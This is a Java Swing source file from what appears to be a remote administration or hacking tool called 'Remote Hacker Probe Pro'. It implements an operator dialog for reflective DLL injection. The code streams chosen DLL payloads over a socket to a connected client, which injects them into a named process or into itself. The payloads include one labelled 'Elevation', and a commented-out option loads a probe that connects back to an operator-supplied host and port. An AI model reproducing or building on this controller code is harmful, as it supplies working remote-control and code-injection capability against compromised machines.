package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.ComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JComboBox;
import javax.swing.JCheckBox;
import javax.swing.JTextField;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

import javax.swing.JTextArea;
import javax.swing.DefaultComboBoxModel;

public class ReflectiveDLLInjection extends JDialog {
	private JTextField proc_name;
	
	static JTextArea s = new JTextArea();
	JScrollPane dllLog = new JScrollPane(s);
	File dllFile;
	JLabel infoLbl;
	private JTextField dllArgs;
	Socket CLIENTSOCKET;
	JButton injectBtn;
	/**
	 
	public static void main(String[] args) {
		try {
			ReflectiveDLLInjection dialog = new ReflectiveDLLInjection();
			dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			dialog.setVisible(true);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	*/
	public static void LogDLL(String text)
	{
		s.append("[+] " + text + "\n");
	}
	
	// if(timeInterval.length() > 0 || timeInterval.matches("^[0-9]*$") && timeInterval.length() > 2){
	
	/*
	 * Reflective DLL Injection
	 * file - The DLL 'File'
	 * shinject - Self injection? 
	 * process_name - The name of the process to inject into
	 * args - Arguments to pass on the dll
	 * CLIENTSOCKET - the client socket
	 * getOutput - Do you want to read output?
	 * timeInterval - Time interval to wait before reading output
	 * */
	public static void DLLInject(File file, Boolean shinject, String process_name, String args, Socket CLIENTSOCKET, Boolean getOutput, String timeInterval)
	{
		long filesize = file.length();
		byte[] file_buffer = new byte[4096];
		Arrays.fill(file_buffer, (byte)0);
		int count = 0;
		DataOutputStream out = null;
		try {
			out = new DataOutputStream(CLIENTSOCKET.getOutputStream());
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		FileInputStream  in = null;
		try {
			in = new FileInputStream(file);

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();	
		}
		
		Boolean isArgs = false;
		if(args.length() > 0)
		{
			isArgs = true;
			
		} else {
			isArgs = false;
		}
		
		
		String Argstr, Outputstr, pStr;
		if(isArgs)
		{
			Argstr = args;
		} else {
			Argstr = "None";
		}
		
		if(getOutput) {
			Outputstr = "TRUE;;" + timeInterval;
		} else {
			Outputstr = "FALSE";
		}
		
		if(shinject)
		{
			pStr = "None"; // the client will inject in itself, SELF INJECTION!
		} else {
			pStr = process_name;
		}
		// System.out.println("REMOTE_HACKER_PROBE;;"+String.valueOf(filesize) + ";;" + pStr +";;"+ Argstr + ";;" + Outputstr);
		Server.SendData(CLIENTSOCKET, "fdll");
		Server.SendData(CLIENTSOCKET, "REMOTE_HACKER_PROBE;;"+String.valueOf(filesize) + ";;" + pStr +";;"+ Argstr + ";;" + Outputstr);
		// Send the DLL!
		
		try {
			TimeUnit.SECONDS.sleep(1);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		try {
			while ((count = in.read(file_buffer)) > 0) {
			     out.write(file_buffer, 0, count);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	/**
	 * Create the dialog.
	 */
	public ReflectiveDLLInjection() {
		s.setEditable(false);
		s.setFont(new Font("Consolas", Font.PLAIN, 13));
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe Pro | Reflective DLL Injection");
		setBounds(100, 100, 459, 497);
		
		String time[] = {"1","2","3","4","5", "6", "7", "8","9","10","11","12","13","14","15"};
		JComboBox timetoWait = new JComboBox(time);
		
		timetoWait.setModel(new DefaultComboBoxModel(time));
		timetoWait.setEnabled(false);
		JCheckBox readoutput = new JCheckBox("Read Output");
		timetoWait.setSelectedIndex(4);
		readoutput.addItemListener(new ItemListener() {
		    @Override
		    public void itemStateChanged(ItemEvent e) {
		        if(e.getStateChange() == ItemEvent.SELECTED) {
		           timetoWait.setEnabled(true);
		      
		        } else {
		        	timetoWait.setEnabled(false);
		        };
		        
		    }
		});
		proc_name = new JTextField();
		proc_name.setColumns(10);
		
		JLabel lblNewLabel_2 = new JLabel("Process Name : ");
		
		JCheckBox shinject = new JCheckBox("Self Injection");
		shinject.addItemListener(new ItemListener() {
		    @Override
		    public void itemStateChanged(ItemEvent e) {
		        if(e.getStateChange() == ItemEvent.SELECTED) {
		            proc_name.setEditable(false);
		        } else {
		        	proc_name.setEditable(true);
		        };
		    }
		});
		
		List<String> dllList = new ArrayList<String>(); 
		dllList.add("Message Box"); // 0
		dllList.add("Open URL"); // 1
		dllList.add("Load Custom"); // 2
		dllList.add("Elevation"); // 3
		//dllList.add("Reflective Probe"); // 4
		
		JComboBox dlls = new JComboBox(dllList.toArray());
		dlls.setSelectedItem(null);
		//ComboBoxModel cmModel = new ComboBoxModel();
		dlls.addItemListener(new ItemListener() {
			  @Override
			  public void itemStateChanged(ItemEvent e) {
				  if(e.getStateChange() == ItemEvent.SELECTED) {
			            String selectedItem = dlls.getSelectedItem().toString();
			            if(selectedItem.equals(dllList.get(1))) {
			            	//shinject.setSelected(true);
			            	readoutput.setSelected(true);
			            	dllArgs.setText("https://MY-URL-Here.com");
			            	dllFile = new File("payloads/OpenURL.dll");
			            	// System.out.println(selectedItem);
			            } else if(selectedItem.equals(dllList.get(2)))
			            {
			            	JFileChooser filechooser = new JFileChooser();
							FileNameExtensionFilter filter = new FileNameExtensionFilter("DLL File","dll");
							filechooser.setFileFilter(filter);
							int s = filechooser.showOpenDialog(null);
							if(s == JFileChooser.APPROVE_OPTION)
							{
								dllFile = filechooser.getSelectedFile();
								dllList.add(dllFile.getName());
								dlls.addItem(dllFile.getName());
								dlls.setSelectedItem(dllFile.getName());
							}
							
			            } 
			            
			            else if(selectedItem.equals(dllList.get(0)))
			            {
			            	//System.out.println(selectedItem);
			            	readoutput.setSelected(true);
			            	dllArgs.setText("Hello, World!");
			            	dllFile = new File("payloads/MsgBoxDll.dll");
			            } 
			            
			            else if(selectedItem.equals(dllList.get(3)))
			            {
			            	readoutput.setSelected(true);
			            	//dllArgs.setText("");
			            	dllFile = new File("payloads/Elevation.dll");
			            }
			            /*
			            else if(selectedItem.equals(dllList.get(4)))
			            {
			            	// Loading reflective Probe
			            	String HOST = JOptionPane.showInputDialog("Enter HOST to Connect to : ");
			            	String PORT = JOptionPane.showInputDialog("Enter PORT to Connect to : ");
			            	if(HOST.length() > 0 && PORT.length() > 0) {
			            		dllFile = new File("payloads/ReflectiveProbe.dll");
			            		
			            		int ask = JOptionPane.showConfirmDialog(null, "Continue Loading Reflective Probe?", "Reflective Probe", JOptionPane.OK_CANCEL_OPTION);
			            		if(ask == JOptionPane.OK_OPTION) {
			            			dllArgs.setText(HOST+":"+PORT);
			            			injectBtn.doClick();
			            		}
			            	}
			            }*/
			            
			        }   
			  }
			 });
		
		JLabel lblNewLabel_1 = new JLabel("DLL Payload : ");
		
		JLabel lblNewLabel = new JLabel("Reflective DLL Injection");
		lblNewLabel.setFont(new Font("Calibri", Font.PLAIN, 16));
		
		injectBtn = new JButton("Inject");
		injectBtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Boolean read_output;
				Boolean self_inject;
				String pname = proc_name.getText();
				String args = dllArgs.getText();
				String timeint = timetoWait.getSelectedItem().toString();
				if(readoutput.isSelected()) {
					read_output = true;
				} else {
					read_output = false;
				}
				
				if(shinject.isSelected())
				{
					self_inject = true;
				} else {
					self_inject = false;
				}
				/*
				 *  * Reflective DLL Injection
	 * file - The DLL 'File'
	 * shinject - Self injection? 
	 * process_name - The name of the process to inject into
	 * args - Arguments to pass on the dll
	 * CLIENTSOCKET - the client socket
	 * getOutput - Do you want to read output?
	 * timeInterval - Time interval to wait before reading output
				 */
				if(self_inject) {
					LogDLL("Injecting " + dllFile.getAbsolutePath() + " using Self Injection.");
				} else {
					LogDLL("Injecting " + dllFile.getAbsolutePath() + " in Process " + pname);
				}
				
				DLLInject(dllFile, self_inject, pname, args, CLIENTSOCKET, read_output, timeint);
			}
		});
		
		
		dllLog.setFont(new Font("Consolas", Font.PLAIN, 14));
		
		
		
		JLabel lblNewLabel_3 = new JLabel("Time to wait before Reading Output (in Seconds) :");
		
		JLabel lblNewLabel_2_1 = new JLabel("DLL Arguments : ");
		
		dllArgs = new JTextField();
		dllArgs.setColumns(10);
		
		infoLbl = new JLabel("infoLabel");
		GroupLayout groupLayout = new GroupLayout(getContentPane());
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(lblNewLabel, GroupLayout.PREFERRED_SIZE, 181, GroupLayout.PREFERRED_SIZE)
							.addContainerGap())
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(shinject, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(readoutput, GroupLayout.PREFERRED_SIZE, 99, GroupLayout.PREFERRED_SIZE)
							.addContainerGap())
						.addGroup(Alignment.TRAILING, groupLayout.createSequentialGroup()
							.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
								.addComponent(infoLbl, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE)
								.addComponent(dllLog, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE)
								.addGroup(Alignment.LEADING, groupLayout.createSequentialGroup()
									.addComponent(lblNewLabel_3, GroupLayout.PREFERRED_SIZE, 266, GroupLayout.PREFERRED_SIZE)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(timetoWait, 0, 153, Short.MAX_VALUE))
								.addGroup(Alignment.LEADING, groupLayout.createSequentialGroup()
									.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
										.addComponent(lblNewLabel_1, GroupLayout.PREFERRED_SIZE, 80, GroupLayout.PREFERRED_SIZE)
										.addComponent(lblNewLabel_2_1, GroupLayout.PREFERRED_SIZE, 95, GroupLayout.PREFERRED_SIZE)
										.addComponent(lblNewLabel_2))
									.addPreferredGap(ComponentPlacement.RELATED)
									.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
										.addComponent(proc_name, GroupLayout.DEFAULT_SIZE, 324, Short.MAX_VALUE)
										.addComponent(dllArgs, GroupLayout.DEFAULT_SIZE, 324, Short.MAX_VALUE)
										.addComponent(dlls, 0, 324, Short.MAX_VALUE)))
								.addComponent(injectBtn, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE))
							.addContainerGap())))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblNewLabel, GroupLayout.PREFERRED_SIZE, 20, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(infoLbl)
					.addGap(18)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(shinject)
						.addComponent(readoutput))
					.addGap(3)
					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
						.addGroup(groupLayout.createSequentialGroup()
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblNewLabel_3)
								.addComponent(timetoWait, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
							.addGap(32))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(24)
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblNewLabel_2)
								.addComponent(proc_name, GroupLayout.DEFAULT_SIZE, 28, Short.MAX_VALUE))))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblNewLabel_1, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE)
						.addComponent(dlls, GroupLayout.PREFERRED_SIZE, 31, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE, false)
						.addComponent(lblNewLabel_2_1)
						.addComponent(dllArgs, GroupLayout.PREFERRED_SIZE, 28, GroupLayout.PREFERRED_SIZE))
					.addGap(20)
					.addComponent(dllLog, GroupLayout.DEFAULT_SIZE, 165, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(injectBtn, GroupLayout.DEFAULT_SIZE, 23, Short.MAX_VALUE)
					.addContainerGap())
		);
		getContentPane().setLayout(groupLayout);
		
		addWindowListener(new WindowAdapter() {
			@Override
		    public void windowOpened(WindowEvent we) {
				MainWindow.HaltAllSystems();
		    }
			
			@Override
			public void windowClosed(WindowEvent we) {
				MainWindow.EnableAllSystems();
			}
		});
	}
}
